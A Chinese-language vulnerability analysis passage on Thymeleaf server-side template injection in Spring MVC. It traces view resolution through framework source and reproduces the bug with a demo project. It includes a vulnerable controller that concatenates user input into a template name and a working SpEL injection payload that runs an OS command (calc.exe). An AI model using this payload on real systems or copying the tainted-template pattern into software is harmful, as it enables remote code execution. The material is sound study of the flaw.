<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">handleReturnValue</span><span class="params">(<span class="meta">@Nullable</span> Object returnValue, MethodParameter returnType, ModelAndViewContainer mavContainer, NativeWebRequest webRequest)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    <span class="comment">//获取handler</span></span><br><span class="line">    HandlerMethodReturnValueHandler handler = <span class="keyword">this</span>.selectHandler(returnValue, returnType);</span><br><span class="line">    <span class="keyword">if</span> (handler == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">&quot;Unknown return value type: &quot;</span> + returnType.getParameterType().getName());</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">//执行handleReturnValue操作</span></span><br><span class="line">        handler.handleReturnValue(returnValue, returnType, mavContainer, webRequest);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>ViewNameMethodReturnValueHandler#handleReturnValue</code></p>
<ul>
<li>判断返回值类型是否为字符型，设置<code>mavContainer.viewName</code></li>
<li>判断返回值是否以<code>redirect:</code>开头，如果是的话则设置重定向的属性</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">handleReturnValue</span><span class="params">(<span class="meta">@Nullable</span> Object returnValue, MethodParameter returnType, ModelAndViewContainer mavContainer, NativeWebRequest webRequest)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (returnValue <span class="keyword">instanceof</span> CharSequence) &#123;</span><br><span class="line">        String viewName = returnValue.toString();</span><br><span class="line">        <span class="comment">//设置返回值为viewName</span></span><br><span class="line">        mavContainer.setViewName(viewName);</span><br><span class="line">        <span class="comment">//判断是否需要重定向</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">this</span>.isRedirectViewName(viewName)) &#123;</span><br><span class="line">            mavContainer.setRedirectModelScenario(<span class="keyword">true</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (returnValue != <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> UnsupportedOperationException(<span class="string">&quot;Unexpected return type: &quot;</span> + returnType.getParameterType().getName() + <span class="string">&quot; in method: &quot;</span> + returnType.getMethod());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​    通过上面的操作，将返回值设置为<code>mavContainer.viewName</code>,执行上述操作后返回到<code>RequestMappingHandlerAdapter#invokeHandlerMethod</code>中。通过<code>getModelAndView</code>获取<code>ModelAndView</code>对象。</p>
<p><img src="/2021/11/11/Thymeleaf-SSTI%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20211110113841854.png" alt="image-20211110113841854"></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"> <span class="function"><span class="keyword">protected</span> ModelAndView <span class="title">invokeHandlerMethod</span><span class="params">(HttpServletRequest request, HttpServletResponse response, HandlerMethod handlerMethod)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    ...</span><br><span class="line">ModelAndView var15;</span><br><span class="line">         invocableMethod.invokeAndHandle(webRequest, mavContainer, <span class="keyword">new</span> Object[<span class="number">0</span>]);</span><br><span class="line">         <span class="keyword">if</span> (asyncManager.isConcurrentHandlingStarted()) &#123;</span><br><span class="line">             result = <span class="keyword">null</span>;</span><br><span class="line">             <span class="keyword">return</span> (ModelAndView)result;</span><br><span class="line">         &#125;</span><br><span class="line"><span class="comment">//获取ModelAndView对象</span></span><br><span class="line">         var15 = <span class="keyword">this</span>.getModelAndView(mavContainer, modelFactory, webRequest);</span><br><span class="line">     &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">         webRequest.requestCompleted();</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line">     <span class="keyword">return</span> var15;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>​    <code>getModelAndView</code>根据<code>viewName</code>和<code>model</code>创建<code>ModelAndView</code>对象并返回。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> ModelAndView <span class="title">getModelAndView</span><span class="params">(ModelAndViewContainer mavContainer, ModelFactory modelFactory, NativeWebRequest webRequest)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    modelFactory.updateModel(webRequest, mavContainer);</span><br><span class="line">    <span class="comment">//判断RequestHandled是否为True，如果是则不会创建ModelAndView对象</span></span><br><span class="line">    <span class="keyword">if</span> (mavContainer.isRequestHandled()) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        ModelMap model = mavContainer.getModel();</span><br><span class="line">        <span class="comment">//创建ModelAndView对象</span></span><br><span class="line">        ModelAndView mav = <span class="keyword">new</span> ModelAndView(mavContainer.getViewName(), model, mavContainer.getStatus());</span><br><span class="line">        <span class="keyword">if</span> (!mavContainer.isViewReference()) &#123;</span><br><span class="line">            mav.setView((View)mavContainer.getView());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (model <span class="keyword">instanceof</span> RedirectAttributes) &#123;</span><br><span class="line">            Map&lt;String, ?&gt; flashAttributes = ((RedirectAttributes)model).getFlashAttributes();</span><br><span class="line">            HttpServletRequest request = (HttpServletRequest)webRequest.getNativeRequest(HttpServletRequest.class);</span><br><span class="line">            <span class="keyword">if</span> (request != <span class="keyword">null</span>) &#123;</span><br><span class="line">                RequestContextUtils.getOutputFlashMap(request).putAll(flashAttributes);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> mav;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="获取视图"><a href="#获取视图" class="headerlink" title="获取视图"></a>获取视图</h3><p>​    获取<code>ModelAndView</code>后，通过<code>DispatcherServlet#render</code>获取视图解析器并渲染。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">render</span><span class="params">(ModelAndView mv, HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Locale locale = <span class="keyword">this</span>.localeResolver != <span class="keyword">null</span> ? <span class="keyword">this</span>.localeResolver.resolveLocale(request) : request.getLocale();</span><br><span class="line">        response.setLocale(locale);</span><br><span class="line">        String viewName = mv.getViewName();</span><br><span class="line">        View view;</span><br><span class="line">        <span class="keyword">if</span> (viewName != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="comment">//获取视图解析器</span></span><br><span class="line">            view = <span class="keyword">this</span>.resolveViewName(viewName, mv.getModelInternal(), locale, request);</span><br><span class="line">            <span class="keyword">if</span> (view == <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> ServletException(<span class="string">&quot;Could not resolve view with name &#x27;&quot;</span> + mv.getViewName() + <span class="string">&quot;&#x27; in servlet with name &#x27;&quot;</span> + <span class="keyword">this</span>.getServletName() + <span class="string">&quot;&#x27;&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            view = mv.getView();</span><br><span class="line">            <span class="keyword">if</span> (view == <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> ServletException(<span class="string">&quot;ModelAndView [&quot;</span> + mv + <span class="string">&quot;] neither contains a view name nor a View object in servlet with name &#x27;&quot;</span> + <span class="keyword">this</span>.getServletName() + <span class="string">&quot;&#x27;&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">this</span>.logger.isTraceEnabled()) &#123;</span><br><span class="line">            <span class="keyword">this</span>.logger.trace(<span class="string">&quot;Rendering view [&quot;</span> + view + <span class="string">&quot;] &quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (mv.getStatus() != <span class="keyword">null</span>) &#123;</span><br><span class="line">                response.setStatus(mv.getStatus().value());</span><br><span class="line">            &#125;</span><br><span class="line">		<span class="comment">//渲染</span></span><br><span class="line">            view.render(mv.getModelInternal(), request, response);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception var8) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">this</span>.logger.isDebugEnabled()) &#123;</span><br><span class="line">                <span class="keyword">this</span>.logger.debug(<span class="string">&quot;Error rendering view [&quot;</span> + view + <span class="string">&quot;]&quot;</span>, var8);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">throw</span> var8;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>​    获取视图解析器在<code>DispatcherServlet#resolveViewName</code>中完成，循环遍历所有视图解析器解析视图，解析成功则返回。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> View <span class="title">resolveViewName</span><span class="params">(String viewName, <span class="meta">@Nullable</span> Map&lt;String, Object&gt; model, Locale locale, HttpServletRequest request)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">      <span class="keyword">if</span> (<span class="keyword">this</span>.viewResolvers != <span class="keyword">null</span>) &#123;</span><br><span class="line">          Iterator var5 = <span class="keyword">this</span>.viewResolvers.iterator();</span><br><span class="line"><span class="comment">//循环遍历所有的视图解析器获取视图</span></span><br><span class="line">          <span class="keyword">while</span>(var5.hasNext()) &#123;</span><br><span class="line">              ViewResolver viewResolver = (ViewResolver)var5.next();</span><br><span class="line">              View view = viewResolver.resolveViewName(viewName, locale);</span><br><span class="line">              <span class="keyword">if</span> (view != <span class="keyword">null</span>) &#123;</span><br><span class="line">                  <span class="keyword">return</span> view;</span><br><span class="line">              &#125;</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>​    在<code>Demo</code>中有5个视图解析器。</p>
<p><img src="/2021/11/11/Thymeleaf-SSTI%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20211110134445262.png" alt="image-20211110134445262"></p>
<p>​    本以为会在<code>ThymeleafViewResolver</code>中获取视图，实际调试发现<code>ContentNegotiatingViewResolver</code>中已经获取到了视图。</p>
<p><img src="/2021/11/11/Thymeleaf-SSTI%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20211110134655900.png" alt="image-20211110134655900"></p>
<p>​    <code>ContentNegotiatingViewResolver</code>视图解析器允许使用同样的数据获取不同的View。支持下面三种方式。</p>
<blockquote>
<ol>
<li><p>使用扩展名<br><a target="_blank" rel="noopener" href="http://localhost:8080/employees/nego/Jack.xml">http://localhost:8080/employees/nego/Jack.xml</a> 返回结果为XML<br><a target="_blank" rel="noopener" href="http://localhost:8080/employees/nego/Jack.json">http://localhost:8080/employees/nego/Jack.json</a> 返回结果为JSON<br><a target="_blank" rel="noopener" href="http://localhost:8080/employees/nego/Jack">http://localhost:8080/employees/nego/Jack</a> 使用默认view呈现，比如JSP</p>
</li>
<li><p>HTTP Request Header中的Accept，Accept 分别是 text/jsp, text/pdf, text/xml, text/json, 无Accept 请求头</p>
</li>
<li><p>使用参数<br><a target="_blank" rel="noopener" href="http://localhost:8080/employees/nego/Jack?format=xml">http://localhost:8080/employees/nego/Jack?format=xml</a> 返回结果为XML<br><a target="_blank" rel="noopener" href="http://localhost:8080/employees/nego/Jack?format=json">http://localhost:8080/employees/nego/Jack?format=json</a> 返回结果为JSON</p>
</li>
</ol>
</blockquote>
<p>​    <code>ContentNegotiatingViewResolver#resolveViewName</code></p>
<ul>
<li><code>getCandidateViews</code>循环调用所有的ViewResolver解析视图，解析成功放到视图列表中返回。同样也会根据Accept头得到后缀并通过ViewResolver解析视图。</li>
<li><code>getBestView</code>根据Accept头获取最优的视图返回。</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> View <span class="title">resolveViewName</span><span class="params">(String viewName, Locale locale)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        RequestAttributes attrs = RequestContextHolder.getRequestAttributes();</span><br><span class="line">        Assert.state(attrs <span class="keyword">instanceof</span> ServletRequestAttributes, <span class="string">&quot;No current ServletRequestAttributes&quot;</span>);</span><br><span class="line">        List&lt;MediaType&gt; requestedMediaTypes = <span class="keyword">this</span>.getMediaTypes(((ServletRequestAttributes)attrs).getRequest());</span><br><span class="line">        <span class="keyword">if</span> (requestedMediaTypes != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="comment">//获取可以解析当前视图的列表。</span></span><br><span class="line">            List&lt;View&gt; candidateViews = <span class="keyword">this</span>.getCandidateViews(viewName, locale, requestedMediaTypes);</span><br><span class="line">            <span class="comment">//根据Accept头获取一个最优的视图返回</span></span><br><span class="line">            View bestView = <span class="keyword">this</span>.getBestView(candidateViews, requestedMediaTypes, attrs);</span><br><span class="line">            <span class="keyword">if</span> (bestView != <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> bestView;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="视图渲染"><a href="#视图渲染" class="headerlink" title="视图渲染"></a>视图渲染</h3><p>​    得到View后，调用render方法渲染，也就是<code>ThymleafView#render</code>渲染。<code>render</code>方法中又通过调用<code>renderFragment</code>完成实际的渲染工作。</p>
<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>​    我这里使用**<a target="_blank" rel="noopener" href="https://github.com/veracode-research/spring-view-manipulation">spring-view-manipulation</a>**项目来做漏洞复现。</p>
<h3 id="templatename"><a href="#templatename" class="headerlink" title="templatename"></a>templatename</h3><h4 id="漏洞代码"><a href="#漏洞代码" class="headerlink" title="漏洞代码"></a>漏洞代码</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@GetMapping(&quot;/path&quot;)</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">path</span><span class="params">(<span class="meta">@RequestParam</span> String lang)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;user/&quot;</span> + lang + <span class="string">&quot;/welcome&quot;</span>; <span class="comment">//template path is tainted</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__$%7bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(%22calc.exe%22).getInputStream()).next()%7d__::.x</span><br></pre></td></tr></table></figure>

<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>​    在<code>renderFragment</code>渲染的过程中，存在如下代码。</p>
<ul>
<li>当TemplateName中不包含<code>::</code>则将<code>viewTemplateName</code>赋值给<code>templateName</code>。</li>
<li>如果包含<code>::</code>则代表是一个片段表达式，则需要解析<code>templateName</code>和<code>markupSelectors</code>。</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">renderFragment</span><span class="params">(Set&lt;String&gt; markupSelectorsToRender, Map&lt;String, ?&gt; model, HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="comment">//viewTemplateName中包含::则当作片段表达式执行</span></span><br><span class="line">     <span class="keyword">if</span> (!viewTemplateName.contains(<span class="string">&quot;::&quot;</span>)) &#123;</span><br><span class="line">              templateName = viewTemplateName;</span><br><span class="line">              markupSelectors = <span class="keyword">null</span>;</span><br><span class="line">          &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">              IStandardExpressionParser parser = StandardExpressions.getExpressionParser(configuration);</span><br><span class="line"></span><br><span class="line">              FragmentExpression fragmentExpression;</span><br><span class="line">              <span class="keyword">try</span> &#123;</span><br><span class="line">           <span class="comment">//	根据viewTemplateName得到FragmentExpression</span></span><br><span class="line">                  fragmentExpression = (FragmentExpression)parser.parseExpression(context, <span class="string">&quot;~&#123;&quot;</span> + viewTemplateName + <span class="string">&quot;&#125;&quot;</span>);</span><br><span class="line">              &#125; <span class="keyword">catch</span> (TemplateProcessingException var25) &#123;</span><br><span class="line">                  <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">&quot;Invalid template name specification: &#x27;&quot;</span> + viewTemplateName + <span class="string">&quot;&#x27;&quot;</span>);</span><br><span class="line">              &#125;</span><br><span class="line"><span class="comment">//创建ExecutedFragmentExpression</span></span><br><span class="line">              ExecutedFragmentExpression fragment = FragmentExpression.createExecutedFragmentExpression(context, fragmentExpression);</span><br><span class="line">       <span class="comment">//获取templateName和markupSelectors</span></span><br><span class="line">       templateName = FragmentExpression.resolveTemplateName(fragment);</span><br><span class="line">              markupSelectors = FragmentExpression.resolveFragments(fragment);</span><br><span class="line">              Map&lt;String, Object&gt; nameFragmentParameters = fragment.getFragmentParameters();</span><br><span class="line">              <span class="keyword">if</span> (nameFragmentParameters != <span class="keyword">null</span>) &#123;</span><br><span class="line">                  <span class="keyword">if</span> (fragment.hasSyntheticParameters()) &#123;</span><br><span class="line">                      <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">&quot;Parameters in a view specification must be named (non-synthetic): &#x27;&quot;</span> + viewTemplateName + <span class="string">&quot;&#x27;&quot;</span>);</span><br><span class="line">                  &#125;</span><br><span class="line"></span><br><span class="line">                  context.setVariables(nameFragmentParameters);</span><br><span class="line">              &#125;</span><br><span class="line">          &#125;</span><br><span class="line">    ...</span><br><span class="line">    viewTemplateEngine.process(templateName, processMarkupSelectors, context, (Writer)templateWriter);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>​    比如当viewTemplateName为<code>welcome :: header</code>则会将welcome解析为templateName，将header解析为markupSelectors。</p>
<p><img src="/2021/11/11/Thymeleaf-SSTI%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20211110153345663.png" alt="image-20211110153345663"></p>
<p>​    上面只是分析了为什么要根据<code>::</code>做不同的处理，并不涉及到漏洞，但是当视图名中包含<code>::</code>会执行下面的代码。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fragmentExpression = (FragmentExpression)parser.parseExpression(context, <span class="string">&quot;~&#123;&quot;</span> + viewTemplateName + <span class="string">&quot;&#125;&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>​        在<code>StandardExpressionParser#parseExpression</code>中会通过<code>preprocess</code>进行预处理，预处理根据该正则<code>\\_\\_(.*?)\\_\\_</code>提取<code>__xx__</code>间的内容，获取<code>expression</code>并执行<code>execute</code>方法。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Pattern PREPROCESS_EVAL_PATTERN = Pattern.compile(<span class="string">&quot;\\_\\_(.*?)\\_\\_&quot;</span>, <span class="number">32</span>);</span><br><span class="line">  <span class="function"><span class="keyword">static</span> String <span class="title">preprocess</span><span class="params">(IExpressionContext context, String input)</span> </span>&#123;</span><br><span class="line">      <span class="keyword">if</span> (input.indexOf(<span class="number">95</span>) == -<span class="number">1</span>) &#123;</span><br><span class="line">          <span class="keyword">return</span> input;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">          IStandardExpressionParser expressionParser = StandardExpressions.getExpressionParser(context.getConfiguration());</span><br><span class="line">          <span class="keyword">if</span> (!(expressionParser <span class="keyword">instanceof</span> StandardExpressionParser)) &#123;</span><br><span class="line">              <span class="keyword">return</span> input;</span><br><span class="line">          &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">              Matcher matcher = PREPROCESS_EVAL_PATTERN.matcher(input);</span><br><span class="line">              <span class="keyword">if</span> (!matcher.find()) &#123;</span><br><span class="line">                  <span class="keyword">return</span> checkPreprocessingMarkUnescaping(input);</span><br><span class="line">              &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                  StringBuilder strBuilder = <span class="keyword">new</span> StringBuilder(input.length() + <span class="number">24</span>);</span><br><span class="line">                  <span class="keyword">int</span> curr = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">                  String remaining;</span><br><span class="line">                  <span class="keyword">do</span> &#123;</span><br><span class="line">                      remaining = checkPreprocessingMarkUnescaping(input.substring(curr, matcher.start(<span class="number">0</span>)));</span><br><span class="line">        <span class="comment">//提取__之间的内容</span></span><br><span class="line">                      String expressionText = checkPreprocessingMarkUnescaping(matcher.group(<span class="number">1</span>));</span><br><span class="line">                      strBuilder.append(remaining);</span><br><span class="line">       <span class="comment">//获取expression</span></span><br><span class="line">                      IStandardExpression expression = StandardExpressionParser.parseExpression(context, expressionText, <span class="keyword">false</span>);</span><br><span class="line">                      <span class="keyword">if</span> (expression == <span class="keyword">null</span>) &#123;</span><br><span class="line">                          <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">                      &#125;</span><br><span class="line">      <span class="comment">//执行execute方法</span></span><br><span class="line">                      Object result = expression.execute(context, StandardExpressionExecutionContext.RESTRICTED);</span><br><span class="line">                      strBuilder.append(result);</span><br><span class="line">                      curr = matcher.end(<span class="number">0</span>);</span><br><span class="line">                  &#125; <span class="keyword">while</span>(matcher.find());</span><br><span class="line"></span><br><span class="line">                  remaining = checkPreprocessingMarkUnescaping(input.substring(curr));</span><br><span class="line">                  strBuilder.append(remaining);</span><br><span class="line">                  <span class="keyword">return</span> strBuilder.toString().trim();</span><br><span class="line">              &#125;</span><br></pre></td></tr></table></figure>

<p>​    <code>execute</code>经过层层调用最终通过SPEL执行表达式的内容。</p>
<p><img src="/2021/11/11/Thymeleaf-SSTI%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20211110164314996.png" alt="image-20211110164314996"></p>
<p><img src="/2021/11/11/Thymeleaf-SSTI%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20211110164247728.png" alt="image-20211110164247728"></p>
<p>​    也就是说这个漏洞本质上是<code>SPEL</code>表达式执行。</p>
<h2 id="URI-PATH"><a href="#URI-PATH" class="headerlink" title="URI PATH"></a>URI PATH</h2><p>​    下面的情况也可以触发漏洞,这个可能很多师傅和我一样都觉得很奇怪，这个并没有返回值，理论上是不会执行的。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@GetMapping(&quot;/doc/&#123;document&#125;&quot;)</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">getDocument</span><span class="params">(<span class="meta">@PathVariable</span> String document)</span> </span>&#123;</span><br><span class="line">    log.info(<span class="string">&quot;Retrieving &quot;</span> + document);</span><br><span class="line">    <span class="comment">//returns void, so view name is taken from URI</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​    前面我们分析了<code>SpingMVC</code>视图解析的过程，在解析视图首先获取返回值并封装为<code>ModleAndView</code>，而在当前当前环境中并没有返回值，按理说<code>ModelAndView</code>应该为空，为什么还能正常得到<code>ModleAndView</code>呢？</p>
<p>​    原因主要在<code>DispatcherServlet#doDispatch</code>中，获取<code>ModleAndView</code>后还会执行<code>applyDefaultViewName</code>方法。</p>
